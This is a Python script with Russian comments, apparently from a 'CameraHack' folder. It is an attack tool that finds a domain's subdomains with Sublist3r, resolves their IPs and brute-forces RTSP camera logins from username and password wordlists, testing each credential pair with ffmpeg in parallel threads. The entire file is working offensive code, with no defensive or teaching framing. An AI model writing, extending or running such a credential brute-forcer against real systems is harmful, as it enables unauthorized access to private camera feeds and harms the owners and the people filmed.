import argparse
import subprocess
import os
import imageio_ffmpeg as ffmpeg
from concurrent.futures import ThreadPoolExecutor, as_completed

# Функция для поиска поддоменов
def find_subdomains(domain):
    sublist3r_path = "/home/kali/Desktop/APT/ScriptsVsCodium/CameraHack/Sublist3r/sublist3r"  # Обновите путь к Sublist3r
    if not os.path.isfile(sublist3r_path):
        print("[ERROR] Утилита `sublist3r` не найдена. Убедитесь, что путь указан верно.")
        return []

    try:
        print(f"[INFO] Поиск поддоменов для {domain}")
        result = subprocess.run([sublist3r_path, '-d', domain, '-o', 'subdomains.txt'], capture_output=True, text=True)
        if result.returncode == 0:
            with open('subdomains.txt', 'r') as file:
                subdomains = file.read().splitlines()
            os.remove('subdomains.txt')
            return subdomains
        else:
            print(f"[ERROR] Не удалось выполнить поиск поддоменов: {result.stderr}")
            return []
    except Exception as e:
        print(f"[ERROR] Ошибка при поиске поддоменов: {str(e)}")
        return []

# Функция для проверки RTSP потока
def check_rtsp_stream(url):
    try:
        ffmpeg_executable = ffmpeg.get_ffmpeg_exe()
        command = [
            ffmpeg_executable,
            '-rtsp_transport', 'tcp',
            '-i', url,
            '-t', '10',  # Увеличьте время, если необходимо
            '-f', 'null',
            '-'
        ]
        result = subprocess.run(command, capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            print(f"[SUCCESS] RTSP поток доступен: {url}")
        else:
            error_message = result.stderr.strip()
            if "Connection refused" in error_message:
                print(f"[ERROR] Не удалось подключиться к RTSP потоку: {url}")
            else:
                print(f"[ERROR] Ошибка при подключении к RTSP потоку {url}: {error_message}")
    except subprocess.TimeoutExpired:
        print(f"[ERROR] Таймаут при подключении к RTSP потоку: {url}")
    except Exception as e:
        print(f"[ERROR] Ошибка при проверке RTSP потока: {str(e)}")

# Функция для перебора логинов и паролей
def brute_force_rtsp(username, password, ip):
    rtsp_url = f"rtsp://{username}:{password}@{ip}:554/"
    print(f"[INFO] Попытка подключения с логином '{username}' и паролем '{password}' к {ip}")
    check_rtsp_stream(rtsp_url)

# Функция для сканирования домена и поддоменов
def scan_domain(domain, user_file, pass_file):
    subdomains = find_subdomains(domain)
    if not subdomains:
        subdomains = [domain]
    
    try:
        with open(user_file, 'r') as uf, open(pass_file, 'r') as pf:
            users = uf.read().splitlines()
            passwords = pf.read().splitlines()
    except FileNotFoundError as e:
        print(f"[ERROR] Не удалось открыть файл: {str(e)}")
        return
    except Exception as e:
        print(f"[ERROR] Ошибка при чтении файлов: {str(e)}")
        return
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for subdomain in subdomains:
            print(f"[INFO] Сканирование поддомена: {subdomain}")
            try:
                ip = subprocess.check_output(['dig', '+short', subdomain], text=True).strip()
                if not ip:
                    print(f"[WARNING] Не удалось получить IP для {subdomain}")
                    continue
                
                print(f"[INFO] Найден IP: {ip}")

                for user in users:
                    for password in passwords:
                        futures.append(executor.submit(brute_force_rtsp, user, password, ip))
                
            except subprocess.CalledProcessError:
                print(f"[ERROR] Не удалось разрешить IP для {subdomain}")
        
        # Ожидание завершения всех задач
        for future in as_completed(futures):
            try:
                future.result()  # Получаем результат, чтобы обрабатывать исключения, если они возникли
            except Exception as e:
                print(f"[ERROR] Ошибка при выполнении задачи: {str(e)}")

# Основная функция
def main():
    parser = argparse.ArgumentParser(description="Сканирование доменов для камер RTSP")
    parser.add_argument('domain', type=str, help='Домен для сканирования')
    parser.add_argument('user_file', type=str, help='Файл с логинами для брутфорса')
    parser.add_argument('pass_file', type=str, help='Файл с паролями для брутфорса')
    args = parser.parse_args()

    print(f"[INFO] Сканирование домена {args.domain}")
    scan_domain(args.domain, args.user_file, args.pass_file)

if __name__ == "__main__":
    main()
